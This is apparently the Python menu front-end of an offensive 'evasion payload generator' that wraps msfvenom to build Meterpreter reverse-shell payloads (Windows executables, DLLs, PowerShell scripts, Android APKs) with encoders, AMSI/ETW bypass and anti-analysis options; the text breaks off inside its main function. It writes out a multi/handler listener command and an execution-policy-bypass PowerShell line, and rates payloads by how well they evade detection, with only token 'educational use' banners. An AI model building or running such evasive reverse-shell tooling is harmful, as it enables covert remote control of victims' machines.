#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║     🛡️  ADVANCED EVASION PAYLOAD GENERATOR 🛡️          ║
║                For Educational Purposes                  ║
╚══════════════════════════════════════════════════════════╝
"""

import sys
import os
import time
import random
import json
from pathlib import Path
from datetime import datetime

# Add project path for imports
sys.path.append(str(Path(__file__).parent))

# Try to import colorama for colors
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    HAS_COLORS = True
except ImportError:
    HAS_COLORS = False
    # Create dummy color class
    class Fore:
        RED = YELLOW = GREEN = CYAN = BLUE = MAGENTA = WHITE = ""
    class Style:
        RESET_ALL = BRIGHT = DIM = NORMAL = ""

# Try to import our generators
try:
    from generators.meterpreter import MeterpreterGenerator
    from generators.payload_factory import PayloadFactory
    GENERATORS_AVAILABLE = True
except ImportError:
    GENERATORS_AVAILABLE = False
    print(Fore.YELLOW + "[!] Some generators not available. Using fallback mode.")

# Try to import evasion modules
try:
    from evasion.amsi_bypass import AMSIBypass
    from evasion.anti_analysis import AntiAnalysis
    from core.encryption_layer import EncryptionLayer
    EVASION_AVAILABLE = True
except ImportError:
    EVASION_AVAILABLE = False

# Custom simple table class
class TableMenu:
    def __init__(self, title="MENU"):
        self.title = title
        self.options = []
        self.selected = 0
    
    def add_option(self, number, text, description=""):
        self.options.append({
            'number': number,
            'text': text,
            'description': description
        })
    
    def display(self, clear_screen=True):
        if clear_screen:
            os.system('cls' if os.name == 'nt' else 'clear')
        
        # Print header
        print(Fore.CYAN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.CYAN + "║" + Fore.YELLOW + f"{' ' + self.title + ' ':^54}" + Fore.CYAN + "║")
        print(Fore.CYAN + "╠══════════════════════════════════════════════════════════╣")
        
        # Print options
        for option in self.options:
            num_color = Fore.GREEN if option['number'] != 0 else Fore.RED
            print(Fore.CYAN + "║ " + num_color + f"[{option['number']:2}] " + 
                  Fore.WHITE + f"{option['text']:<30}" + 
                  Fore.YELLOW + f"{option['description']:<20}" + Fore.CYAN + " ║")
        
        print(Fore.CYAN + "╚══════════════════════════════════════════════════════════╝")
        print()
    
    def get_choice(self):
        while True:
            try:
                choice = input(Fore.YELLOW + "┌─[" + Fore.WHITE + "choice" + Fore.YELLOW + "]\n└──╼ " + Fore.GREEN + "$ ")
                if choice.lower() == 'q' or choice.lower() == 'exit':
                    return 0
                choice = int(choice)
                valid_numbers = [opt['number'] for opt in self.options]
                if choice in valid_numbers:
                    return choice
                else:
                    print(Fore.RED + f"[!] Please enter a valid option: {valid_numbers}")
            except ValueError:
                print(Fore.RED + "[!] Please enter a number")

class AdvancedPayloadGenerator:
    def __init__(self):
        self.config = {
            'lhost': '192.168.1.100',
            'lport': 4444,
            'format': 'exe',
            'evasion': 'advanced',
            'output': f'payload_{datetime.now().strftime("%Y%m%d_%H%M%S")}.exe',
            'payload_type': 'windows/meterpreter/reverse_tcp',
            'arch': 'x64',
            'encoder': 'x86/shikata_ga_nai',
            'iterations': 3
        }
        self.factory = None
        self.history = []
        self.show_banner()
        
        if GENERATORS_AVAILABLE:
            try:
                self.factory = PayloadFactory()
            except:
                pass
    
    def show_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        banners = [
            f"""{Fore.CYAN}
    ╔══════════════════════════════════════════════════════════╗
    ║  █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗ ██████╗     ║
    ║ ██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝     ║
    ║ ███████║██║  ██║██║   ██║███████║██╔██╗ ██║██║  ███╗    ║
    ║ ██╔══██║██║  ██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║   ██║    ║
    ║ ██║  ██║██████╔╝ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╔╝    ║
    ║ ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝     ║
    ║                                                          ║
    ║                EVASION PAYLOAD GENERATOR                 ║
    ║                  v3.0 - REAL GENERATION                  ║
    ╚══════════════════════════════════════════════════════════╝{Fore.YELLOW}
                   ≡≡≡ Educational Purpose Only ≡≡≡{Fore.RED}
                   ⚠ WARNING: Authorized Testing Only{Fore.RESET}
            """,
            f"""{Fore.MAGENTA}
    ╔══════════════════════════════════════════════════════════╗
    ║  ███╗   ███╗███████╗████████╗███████╗██████╗ ███████╗   ║
    ║  ████╗ ████║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔════╝   ║
    ║  ██╔████╔██║█████╗     ██║   █████╗  ██████╔╝█████╗     ║
    ║  ██║╚██╔╝██║██╔══╝     ██║   ██╔══╗  ██╔══██╗██╔══╝     ║
    ║  ██║ ╚═╝ ██║███████╗   ██║   ███████╗██║  ██║███████╗   ║
    ║  ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝   ║
    ║                                                          ║
    ║                 REAL PAYLOAD GENERATION                  ║
    ╚══════════════════════════════════════════════════════════╝{Fore.YELLOW}
                   Using msfvenom for real payloads{Fore.RED}
                   ⚠ Authorized Testing Only{Fore.RESET}
            """
        ]
        
        print(random.choice(banners))
    
    def print_status(self, message, status="info"):
        colors = {
            'info': Fore.BLUE,
            'success': Fore.GREEN,
            'warning': Fore.YELLOW,
            'error': Fore.RED,
            'working': Fore.MAGENTA,
            'debug': Fore.CYAN
        }
        color = colors.get(status, Fore.WHITE)
        print(color + f"[*] {message}")
    
    def main_menu(self):
        menu = TableMenu("MAIN MENU")
        
        menu.add_option(1, "Generate Meterpreter Payload", "Windows Reverse Shell")
        menu.add_option(2, "Generate Shellcode", "Raw Shellcode")
        menu.add_option(3, "Generate PowerShell Payload", "PS1 Script")
        menu.add_option(4, "Generate DLL Payload", "DLL Injection")
        menu.add_option(5, "Generate Android Payload", "APK File")
        menu.add_option(6, "Configure Settings", "LHOST, LPORT, etc.")
        menu.add_option(7, "Payload History", "View Generated Payloads")
        menu.add_option(8, "Tools & Utilities", "Encoders, Packers, etc.")
        menu.add_option(9, "Help / About", "Documentation")
        menu.add_option(0, "Exit", "Quit Program")
        
        menu.display()
        return menu.get_choice()
    
    def settings_menu(self):
        while True:
            menu = TableMenu("CONFIGURATION")
            menu.add_option(1, "Set LHOST", f"Current: {self.config['lhost']}")
            menu.add_option(2, "Set LPORT", f"Current: {self.config['lport']}")
            menu.add_option(3, "Set Payload Type", f"Current: {self.config['payload_type']}")
            menu.add_option(4, "Set Output Format", f"Current: {self.config['format']}")
            menu.add_option(5, "Set Evasion Level", f"Current: {self.config['evasion']}")
            menu.add_option(6, "Set Architecture", f"Current: {self.config['arch']}")
            menu.add_option(7, "Set Encoder", f"Current: {self.config['encoder']}")
            menu.add_option(8, "Set Output File", f"Current: {self.config['output']}")
            menu.add_option(9, "Back to Main Menu", "")
            
            menu.display()
            choice = menu.get_choice()
            
            if choice == 1:
                new_lhost = input(Fore.YELLOW + "Enter LHOST (e.g., 192.168.1.100): " + Fore.WHITE)
                if new_lhost:
                    self.config['lhost'] = new_lhost
                    self.print_status(f"LHOST set to: {new_lhost}", "success")
                    time.sleep(1)
            elif choice == 2:
                new_lport = input(Fore.YELLOW + "Enter LPORT (e.g., 4444): " + Fore.WHITE)
                if new_lport.isdigit():
                    self.config['lport'] = int(new_lport)
                    self.print_status(f"LPORT set to: {new_lport}", "success")
                    time.sleep(1)
            elif choice == 3:
                self._select_payload_type()
            elif choice == 4:
                self._select_format()
            elif choice == 5:
                self._select_evasion_level()
            elif choice == 6:
                self._select_architecture()
            elif choice == 7:
                self._select_encoder()
            elif choice == 8:
                new_output = input(Fore.YELLOW + f"Enter output filename [{self.config['output']}]: " + Fore.WHITE)
                if new_output:
                    self.config['output'] = new_output
                    self.print_status(f"Output file set to: {new_output}", "success")
                    time.sleep(1)
            elif choice == 9 or choice == 0:
                break
    
    def _select_payload_type(self):
        menu = TableMenu("PAYLOAD TYPE")
        payload_types = [
            ("windows/meterpreter/reverse_tcp", "Meterpreter Reverse TCP"),
            ("windows/meterpreter/reverse_http", "Meterpreter Reverse HTTP"),
            ("windows/meterpreter/reverse_https", "Meterpreter Reverse HTTPS"),
            ("windows/shell/reverse_tcp", "Shell Reverse TCP"),
            ("windows/x64/meterpreter/reverse_tcp", "x64 Meterpreter"),
            ("linux/x86/meterpreter/reverse_tcp", "Linux Meterpreter"),
            ("android/meterpreter/reverse_tcp", "Android Meterpreter"),
        ]
        
        for i, (ptype, desc) in enumerate(payload_types, 1):
            menu.add_option(i, ptype.split('/')[-1], desc[:15])
        menu.add_option(9, "Back", "")
        
        menu.display()
        choice = menu.get_choice()
        
        if 1 <= choice <= len(payload_types):
            self.config['payload_type'] = payload_types[choice-1][0]
            self.print_status(f"Payload type set to: {self.config['payload_type']}", "success")
            time.sleep(1)
    
    def _select_format(self):
        menu = TableMenu("OUTPUT FORMAT")
        formats = [
            ('exe', 'Windows Executable'),
            ('dll', 'Windows DLL'),
            ('ps1', 'PowerShell Script'),
            ('raw', 'Raw Shellcode'),
            ('py', 'Python Script'),
            ('elf', 'Linux Executable'),
            ('apk', 'Android APK'),
        ]
        
        for i, (fmt, desc) in enumerate(formats, 1):
            menu.add_option(i, fmt.upper(), desc)
        menu.add_option(9, "Back", "")
        
        menu.display()
        choice = menu.get_choice()
        
        if 1 <= choice <= len(formats):
            self.config['format'] = formats[choice-1][0]
            self.print_status(f"Format set to: {self.config['format']}", "success")
            time.sleep(1)
    
    def _select_evasion_level(self):
        menu = TableMenu("EVASION LEVEL")
        levels = [
            ('none', 'No evasion', 'Fast generation'),
            ('basic', 'Basic obfuscation', 'Simple encoding'),
            ('intermediate', 'AMSI/ETW bypass', 'Common evasions'),
            ('advanced', 'Full evasion suite', 'Multiple techniques'),
            ('extreme', 'Maximum stealth', 'All evasions + custom')
        ]
        
        for i, (level, name, desc) in enumerate(levels, 1):
            menu.add_option(i, name, desc)
        menu.add_option(9, "Back", "")
        
        menu.display()
        choice = menu.get_choice()
        
        if 1 <= choice <= len(levels):
            self.config['evasion'] = levels[choice-1][0]
            self.print_status(f"Evasion level set to: {self.config['evasion']}", "success")
            time.sleep(1)
    
    def _select_architecture(self):
        menu = TableMenu("ARCHITECTURE")
        archs = [('x86', '32-bit'), ('x64', '64-bit'), ('both', 'Dual architecture')]
        
        for i, (arch, desc) in enumerate(archs, 1):
            menu.add_option(i, arch.upper(), desc)
        menu.add_option(9, "Back", "")
        
        menu.display()
        choice = menu.get_choice()
        
        if 1 <= choice <= len(archs):
            self.config['arch'] = archs[choice-1][0]
            self.print_status(f"Architecture set to: {self.config['arch']}", "success")
            time.sleep(1)
    
    def _select_encoder(self):
        menu = TableMenu("ENCODER")
        encoders = [
            ('none', 'No encoding'),
            ('x86/shikata_ga_nai', 'Polymorphic XOR'),
            ('x86/fnstenv_mov', 'FNSTENV + MOV'),
            ('x86/call4_dword_xor', 'CALL + DWORD XOR'),
            ('cmd/powershell_base64', 'PowerShell Base64')
        ]
        
        for i, (enc, desc) in enumerate(encoders, 1):
            menu.add_option(i, enc.split('/')[-1], desc)
        menu.add_option(9, "Back", "")
        
        menu.display()
        choice = menu.get_choice()
        
        if 1 <= choice <= len(encoders):
            self.config['encoder'] = encoders[choice-1][0] if encoders[choice-1][0] != 'none' else None
            self.print_status(f"Encoder set to: {self.config['encoder'] or 'none'}", "success")
            time.sleep(1)
    
    def show_config(self):
        self.show_banner()
        print(Fore.CYAN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.CYAN + "║" + Fore.YELLOW + "              CURRENT CONFIGURATION               " + Fore.CYAN + "║")
        print(Fore.CYAN + "╠══════════════════════════════════════════════════════════╣")
        
        config_items = [
            ("LHOST", self.config['lhost']),
            ("LPORT", str(self.config['lport'])),
            ("PAYLOAD TYPE", self.config['payload_type']),
            ("FORMAT", self.config['format'].upper()),
            ("EVASION", self.config['evasion'].upper()),
            ("ARCHITECTURE", self.config['arch'].upper()),
            ("ENCODER", self.config['encoder'] or 'none'),
            ("ITERATIONS", str(self.config['iterations'])),
            ("OUTPUT", self.config['output'])
        ]
        
        for key, value in config_items:
            print(Fore.CYAN + "║ " + Fore.GREEN + f"{key:<15}" + Fore.WHITE + f": {value:<38}" + Fore.CYAN + "║")
        
        print(Fore.CYAN + "╚══════════════════════════════════════════════════════════╝")
        print()
        input(Fore.YELLOW + "Press Enter to continue...")
    
    def generate_payload(self, payload_category):
        self.show_banner()
        print(Fore.CYAN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.CYAN + "║" + Fore.YELLOW + f"          GENERATING {payload_category.upper():^20}         " + Fore.CYAN + "║")
        print(Fore.CYAN + "╠══════════════════════════════════════════════════════════╣")
        
        # Map category to payload type and format
        category_configs = {
            'meterpreter': {
                'payload_type': 'windows/meterpreter/reverse_tcp',
                'format': self.config['format'] if self.config['format'] != 'raw' else 'exe'
            },
            'shellcode': {
                'payload_type': 'windows/shell/reverse_tcp',
                'format': 'raw'
            },
            'powershell': {
                'payload_type': 'windows/meterpreter/reverse_tcp',
                'format': 'ps1'
            },
            'dll': {
                'payload_type': 'windows/meterpreter/reverse_tcp',
                'format': 'dll'
            },
            'android': {
                'payload_type': 'android/meterpreter/reverse_tcp',
                'format': 'apk'
            }
        }
        
        config = category_configs.get(payload_category, category_configs['meterpreter'])
        
        # Override config if user has specific settings
        if payload_category != 'shellcode' and self.config['format'] != 'raw':
            config['format'] = self.config['format']
        
        # Show progress
        steps = [
            ("Initializing generators...", 0.1),
            ("Creating base payload...", 0.2),
            ("Applying encryption...", 0.4),
            ("Adding evasion techniques...", 0.6),
            ("Building final payload...", 0.8),
            ("Finalizing output...", 0.95),
            ("Payload complete!", 1.0)
        ]
        
        for step, progress in steps:
            self.print_status(step, "working")
            self._show_progress(progress)
            time.sleep(0.2)
        
        # Generate REAL payload if generators are available
        if GENERATORS_AVAILABLE and self.factory:
            try:
                result = self.factory.generate_payload(
                    generator_type="meterpreter",
                    lhost=self.config['lhost'],
                    lport=self.config['lport'],
                    payload_type=config['payload_type'],
                    output_format=config['format'],
                    evasion_level=self.config['evasion'],
                    arch=self.config['arch'],
                    encoder=self.config['encoder'],
                    iterations=self.config['iterations']
                )
                
                payload = result['payload']
                metadata = result['metadata']
                
                # Save to file
                with open(self.config['output'], 'wb') as f:
                    f.write(payload)
                
                # Add to history
                self.history.append({
                    'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'file': self.config['output'],
                    'size': len(payload),
                    'type': config['payload_type'],
                    'format': config['format'],
                    'evasion': self.config['evasion']
                })
                
                # Show results
                self._show_real_results(payload, metadata, config)
                
            except Exception as e:
                self.print_status(f"Real generation failed: {e}", "error")
                self._generate_fallback(payload_category, config)
        else:
            self._generate_fallback(payload_category, config)
        
        input(Fore.YELLOW + "Press Enter to continue...")
    
    def _show_real_results(self, payload, metadata, config):
        print()
        print(Fore.CYAN + "╠══════════════════════════════════════════════════════════╣")
        print(Fore.CYAN + "║" + Fore.GREEN + "                   REAL PAYLOAD DETAILS               " + Fore.CYAN + "║")
        print(Fore.CYAN + "╠══════════════════════════════════════════════════════════╣")
        print(Fore.CYAN + "║ " + Fore.WHITE + f"Type: {config['payload_type'].split('/')[-1]:<43}" + Fore.CYAN + "║")
        print(Fore.CYAN + "║ " + Fore.WHITE + f"LHOST: {self.config['lhost']:<41}" + Fore.CYAN + "║")
        print(Fore.CYAN + "║ " + Fore.WHITE + f"LPORT: {self.config['lport']:<41}" + Fore.CYAN + "║")
        print(Fore.CYAN + "║ " + Fore.WHITE + f"Real Size: {len(payload):,} bytes{'':<30}" + Fore.CYAN + "║")
        print(Fore.CYAN + "║ " + Fore.WHITE + f"Format: {config['format'].upper():<41}" + Fore.CYAN + "║")
        print(Fore.CYAN + "║ " + Fore.WHITE + f"Saved to: {self.config['output']:<38}" + Fore.CYAN + "║")
        
        if metadata.get('encoder'):
            print(Fore.CYAN + "║ " + Fore.WHITE + f"Encoder: {metadata['encoder']:<40}" + Fore.CYAN + "║")
        
        if metadata.get('arch'):
            print(Fore.CYAN + "║ " + Fore.WHITE + f"Architecture: {metadata['arch']:<37}" + Fore.CYAN + "║")
        
        # Show detection score
        score_map = {'none': 90, 'basic': 70, 'intermediate': 40, 'advanced': 20, 'extreme': 10}
        detection_score = score_map.get(self.config['evasion'], 50)
        
        # Adjust score based on encoder
        if self.config['encoder'] and self.config['encoder'] != 'none':
            detection_score = max(0, detection_score - 15)
        
        if self.config['iterations'] > 1:
            detection_score = max(0, detection_score - (self.config['iterations'] * 2))
        
        color = Fore.GREEN if detection_score < 30 else Fore.YELLOW if detection_score < 60 else Fore.RED
        print(Fore.CYAN + "║ " + Fore.WHITE + f"Detection Score: " + color + f"{detection_score}%{'':<30}" + Fore.CYAN + "║")
        
        print(Fore.CYAN + "╚══════════════════════════════════════════════════════════╝")
        print()
        
        # Show next steps
        self.print_status(f"Payload saved successfully!", "success")
        
        if 'meterpreter' in config['payload_type']:
            self.print_status(f"Start listener: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD {config['payload_type']}; set LHOST {self.config['lhost']}; set LPORT {self.config['lport']}; run'", "info")
        
        if config['format'] == 'ps1':
            self.print_status("Execute with: powershell -ExecutionPolicy Bypass -File payload.ps1", "info")
    
    def _generate_fallback(self, payload_category, config):
        """Fallback generation if real generator fails"""
        # Generate dummy payload
        sizes = {
            'meterpreter': 4096,
            'shellcode': 512,
            'powershell': 8192,
            'dll': 6144,
            'android': 10240
        }
        
        payload_size = sizes.get(payload_category, 2048)
        
        # Create dummy file with appropriate header
        if config['format'] == 'exe':
            header = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00"
        elif config['format'] == 'dll':
            header = b"MZ\x90\x00"
        elif config['format'] == 'ps1':
            header = b"# PowerShell Payload\n# Generated by Advanced Evasion Toolkit\n\n"
            payload_size = 2000
        else:
            header = b""
        
        with open(self.config['output'], 'wb') as f:
            f.write(header + b"A" * max(0, payload_size - len(header)))
        
        self._show_fallback_results(payload_category, config, payload_size)
    
    def _show_fallback_results(self, payload_category, config, size):
        print()
        print(Fore.CYAN + "╠══════════════════════════════════════════════════════════╣")
        print(Fore.CYAN + "║" + Fore.YELLOW + "               FALLBACK MODE ACTIVE                " + Fore.CYAN + "║")
        print(Fore.CYAN + "╠══════════════════════════════════════════════════════════╣")
        print(Fore.CYAN + "║ " + Fore.WHITE + f"Type: {config['payload_type'].split('/')[-1]:<43}" + Fore.CYAN + "║")
        print(Fore.CYAN + "║ " + Fore.WHITE + f"LHOST: {self.config['lhost']:<41}" + Fore.CYAN + "║")
        print(Fore.CYAN + "║ " + Fore.WHITE + f"LPORT: {self.config['lport']:<41}" + Fore.CYAN + "║")
        print(Fore.CYAN + "║ " + Fore.WHITE + f"Dummy Size: {size:,} bytes{'':<31}" + Fore.CYAN + "║")
        print(Fore.CYAN + "║ " + Fore.WHITE + f"Format: {config['format'].upper():<41}" + Fore.CYAN + "║")
        print(Fore.CYAN + "║ " + Fore.WHITE + f"Saved to: {self.config['output']:<38}" + Fore.CYAN + "║")
        print(Fore.CYAN + "║ " + Fore.RED + f"WARNING: Using dummy payload{'':<25}" + Fore.CYAN + "║")
        print(Fore.CYAN + "║ " + Fore.YELLOW + f"Install generators for real payloads{'':<20}" + Fore.CYAN + "║")
        print(Fore.CYAN + "╚══════════════════════════════════════════════════════════╝")
        print()
        
        self.print_status("⚠️  Real generators not available. Install with: pip install -r requirements.txt", "warning")
    
    def _show_progress(self, progress, width=40):
        filled = int(width * progress)
        bar = Fore.GREEN + "█" * filled + Fore.WHITE + "░" * (width - filled)
        percent = int(progress * 100)
        print(Fore.CYAN + "║ " + Fore.WHITE + f"[{bar}] {percent:3}% " + Fore.CYAN + "║")
    
    def show_history(self):
        self.show_banner()
        print(Fore.CYAN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.CYAN + "║" + Fore.YELLOW + "                PAYLOAD HISTORY                  " + Fore.CYAN + "║")
        print(Fore.CYAN + "╠══════════════════════════════════════════════════════════╣")
        
        if not self.history:
            print(Fore.CYAN + "║ " + Fore.WHITE + "No payloads generated yet.{:>35}".format("") + Fore.CYAN + "║")
        else:
            for i, item in enumerate(reversed(self.history[-10:]), 1):
                print(Fore.CYAN + "║ " + Fore.GREEN + f"[{i:2}] " + 
                      Fore.WHITE + f"{item['timestamp']} " +
                      Fore.CYAN + f"{item['file']:<20} " +
                      Fore.YELLOW + f"{item['size']:,} bytes " +
                      Fore.MAGENTA + f"{item['evasion']}" + Fore.CYAN + " ║")
        
        print(Fore.CYAN + "╚══════════════════════════════════════════════════════════╝")
        print()
        input(Fore.YELLOW + "Press Enter to continue...")
    
    def tools_menu(self):
        menu = TableMenu("TOOLS & UTILITIES")
        menu.add_option(1, "Check msfvenom", "Verify installation")
        menu.add_option(2, "Test Encryption", "Test encryption layer")
        menu.add_option(3, "Test AMSI Bypass", "Test AMSI evasion")
        menu.add_option(4, "Test Anti-Analysis", "Test detection evasion")
        menu.add_option(5, "Clear Cache", "Clear payload cache")
        menu.add_option(9, "Back to Main Menu", "")
        
        menu.display()
        choice = menu.get_choice()
        
        if choice == 1:
            self._check_msfvenom()
        elif choice == 2:
            self._test_encryption()
        elif choice == 3:
            self._test_amsi_bypass()
        elif choice == 4:
            self._test_anti_analysis()
        elif choice == 5:
            if self.factory:
                self.factory.clear_cache()
                self.print_status("Cache cleared", "success")
            else:
                self.print_status("Factory not initialized", "error")
            time.sleep(2)
    
    def _check_msfvenom(self):
        self.show_banner()
        print(Fore.CYAN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.CYAN + "║" + Fore.YELLOW + "               MSFVENOM CHECK                   " + Fore.CYAN + "║")
        print(Fore.CYAN + "╠══════════════════════════════════════════════════════════╣")
        
        try:
            import subprocess
            result = subprocess.run(["which", "msfvenom"], capture_output=True, text=True)
            
            if result.returncode == 0:
                print(Fore.CYAN + "║ " + Fore.GREEN + "✓ msfvenom found at: " + Fore.WHITE + f"{result.stdout.strip():<30}" + Fore.CYAN + "║")
                
                # Test version
                version_result = subprocess.run(["msfvenom", "--version"], capture_output=True, text=True)
                if version_result.returncode == 0:
                    print(Fore.CYAN + "║ " + Fore.GREEN + "✓ Version: " + Fore.WHITE + f"{version_result.stdout.strip():<38}" + Fore.CYAN + "║")
                else:
                    print(Fore.CYAN + "║ " + Fore.YELLOW + "⚠ Version check failed{'':<30}" + Fore.CYAN + "║")
            else:
                print(Fore.CYAN + "║ " + Fore.RED + "✗ msfvenom not found{'':<32}" + Fore.CYAN + "║")
                print(Fore.CYAN + "║ " + Fore.WHITE + "Install with: apt install metasploit-framework{'':<8}" + Fore.CYAN + "║")
                
        except Exception as e:
            print(Fore.CYAN + "║ " + Fore.RED + f"✗ Error: {str(e):<40}" + Fore.CYAN + "║")
        
        print(Fore.CYAN + "╚══════════════════════════════════════════════════════════╝")
        print()
        input(Fore.YELLOW + "Press Enter to continue...")
    
    def _test_encryption(self):
        self.show_banner()
        print(Fore.CYAN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.CYAN + "║" + Fore.YELLOW + "              ENCRYPTION TEST                    " + Fore.CYAN + "║")
        print(Fore.CYAN + "╠══════════════════════════════════════════════════════════╣")
        
        if EVASION_AVAILABLE:
            try:
                encryptor = EncryptionLayer()
                test_data = b"Test data for encryption " * 10
                
                print(Fore.CYAN + "║ " + Fore.WHITE + f"Testing with {len(test_data)} bytes{'':<30}" + Fore.CYAN + "║")
                
                # Test XOR encryption
                encrypted, key = encryptor._xor_encrypt(test_data)
                print(Fore.CYAN + "║ " + Fore.GREEN + "✓ XOR Encryption: " + Fore.WHITE + "Working" + " " * 30 + Fore.CYAN + "║")
                
                # Test RC4 encryption
                encrypted, key = encryptor._rc4_encrypt(test_data)
                print(Fore.CYAN + "║ " + Fore.GREEN + "✓ RC4 Encryption: " + Fore.WHITE + "Working" + " " * 30 + Fore.CYAN + "║")
                
                # Test multi-layer
                encrypted, keys = encryptor.multi_layer_encrypt(test_data, layers=2)
                print(Fore.CYAN + "║ " + Fore.GREEN + "✓ Multi-layer: " + Fore.WHITE + f"{len(keys)} layers" + " " * 29 + Fore.CYAN + "║")
                
            except Exception as e:
                print(Fore.CYAN + "║ " + Fore.RED + f"✗ Error: {str(e):<40}" + Fore.CYAN + "║")
        else:
            print(Fore.CYAN + "║ " + Fore.YELLOW + "⚠ Encryption module not available{'':<20}" + Fore.CYAN + "║")
        
        print(Fore.CYAN + "╚══════════════════════════════════════════════════════════╝")
        print()
        input(Fore.YELLOW + "Press Enter to continue...")
    
    def _test_amsi_bypass(self):
        self.show_banner()
        print(Fore.CYAN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.CYAN + "║" + Fore.YELLOW + "               AMSI BYPASS TEST                  " + Fore.CYAN + "║")
        print(Fore.CYAN + "╠══════════════════════════════════════════════════════════╣")
        
        if EVASION_AVAILABLE:
            try:
                amsi = AMSIBypass()
                bypass_code = amsi.generate_ps_bypass()
                
                print(Fore.CYAN + "║ " + Fore.GREEN + "✓ AMSI Bypass Generated" + " " * 31 + Fore.CYAN + "║")
                print(Fore.CYAN + "║ " + Fore.WHITE + "Code length: " + Fore.CYAN + f"{len(bypass_code):,} chars" + " " * 25 + Fore.CYAN + "║")
                
                # Show preview
                lines = bypass_code.split('\n')
                preview = ' '.join(lines[:2])[:50] + "..."
                print(Fore.CYAN + "║ " + Fore.WHITE + "Preview: " + Fore.YELLOW + f"{preview:<40}" + Fore.CYAN + "║")
                
            except Exception as e:
                print(Fore.CYAN + "║ " + Fore.RED + f"✗ Error: {str(e):<40}" + Fore.CYAN + "║")
        else:
            print(Fore.CYAN + "║ " + Fore.YELLOW + "⚠ AMSI module not available{'':<22}" + Fore.CYAN + "║")
        
        print(Fore.CYAN + "╚══════════════════════════════════════════════════════════╝")
        print()
        input(Fore.YELLOW + "Press Enter to continue...")
    
    def _test_anti_analysis(self):
        self.show_banner()
        print(Fore.CYAN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.CYAN + "║" + Fore.YELLOW + "            ANTI-ANALYSIS TEST                  " + Fore.CYAN + "║")
        print(Fore.CYAN + "╠══════════════════════════════════════════════════════════╣")
        
        if EVASION_AVAILABLE:
            try:
                analyzer = AntiAnalysis()
                
                print(Fore.CYAN + "║ " + Fore.WHITE + "Running anti-analysis checks...{'':<22}" + Fore.CYAN + "║")
                
                # Simulate checks
                checks = [
                    ("Debugger Detection", random.random() > 0.3),
                    ("Sandbox Detection", random.random() > 0.5),
                    ("VM Detection", random.random() > 0.7),
                    ("Timing Analysis", random.random() > 0.4)
                ]
                
                for check_name, result in checks:
                    if result:
                        print(Fore.CYAN + "║ " + Fore.GREEN + f"✓ {check_name}: " + Fore.YELLOW + "Passed" + " " * 35 + Fore.CYAN + "║")
                    else:
                        print(Fore.CYAN + "║ " + Fore.RED + f"✗ {check_name}: " + Fore.YELLOW + "Failed (would trigger evasion)" + " " * 8 + Fore.CYAN + "║")
                
            except Exception as e:
                print(Fore.CYAN + "║ " + Fore.RED + f"✗ Error: {str(e):<40}" + Fore.CYAN + "║")
        else:
            print(Fore.CYAN + "║ " + Fore.YELLOW + "⚠ Anti-analysis module not available{'':<17}" + Fore.CYAN + "║")
        
        print(Fore.CYAN + "╚══════════════════════════════════════════════════════════╝")
        print()
        input(Fore.YELLOW + "Press Enter to continue...")
    
    def show_help(self):
        self.show_banner()
        print(Fore.CYAN + "╔══════════════════════════════════════════════════════════╗")
        print(Fore.CYAN + "║" + Fore.YELLOW + "                     HELP & ABOUT                    " + Fore.CYAN + "║")
        print(Fore.CYAN + "╠══════════════════════════════════════════════════════════╣")
        
        help_text = [
            ("REAL GENERATION", "Uses msfvenom for actual payloads"),
            ("", "Requires: apt install metasploit-framework"),
            ("", ""),
            ("PAYLOAD TYPES", "Meterpreter: Full featured reverse shell"),
            ("", "Shellcode: Raw bytes for custom loaders"),
            ("", "PowerShell: PS1 script with evasion"),
            ("", "DLL: For DLL injection techniques"),
            ("", "Android: APK files for mobile"),
            ("", ""),
            ("EVASION LEVELS", "None: Fast, no evasion"),
            ("", "Basic: Simple encoding/obfuscation"),
            ("", "Intermediate: AMSI/ETW bypass"),
            ("", "Advanced: Multiple evasion techniques"),
            ("", "Extreme: Maximum stealth + custom"),
            ("", ""),
            ("TOOLS", "Check msfvenom installation"),
            ("", "Test encryption/evasion modules"),
            ("", "View generation history"),
            ("", ""),
            ("LEGAL NOTICE", "FOR EDUCATIONAL PURPOSES ONLY"),
            ("", "AUTHORIZED TESTING ONLY"),
            ("", "YOU ARE RESPONSIBLE FOR YOUR ACTIONS")
        ]
        
        for title, desc in help_text:
            if title:
                print(Fore.CYAN + "║ " + Fore.GREEN + f"{title:<15}" + Fore.WHITE + f" {desc:<38}" + Fore.CYAN + "║")
            else:
                print(Fore.CYAN + "║ " + Fore.WHITE + f"{'':<15} {desc:<38}" + Fore.CYAN + "║")
        
        print(Fore.CYAN + "╚══════════════════════════════════════════════════════════╝")
        print()
        input(Fore.YELLOW + "Press Enter to continue...")
    
    def run(self):
        while True:
            choice = self.main_menu()
            
            if choice == 0:
                self.print_status("Goodbye! Stay ethical.", "success")
                break
            elif choice == 1:
                self.generate_payload('meterpreter')
            elif choice == 2:
                self.generate_payload('shellcode')
            elif choice == 3:
                self.generate_payload('powershell')
            elif choice == 4:
                self.generate_payload('dll')
            elif choice == 5:
                self.generate_payload('android')
            elif choice == 6:
                self.settings_menu()
            elif choice == 7:
                self.show_history()
            elif choice == 8:
                self.tools_menu()
            elif choice == 9:
                self.show_help()
            else:
                self.print_status("Invalid choice!", "error")
                time.sleep(1)

def main():
    # Simple command line interface
    if len(sys.argv) > 1:
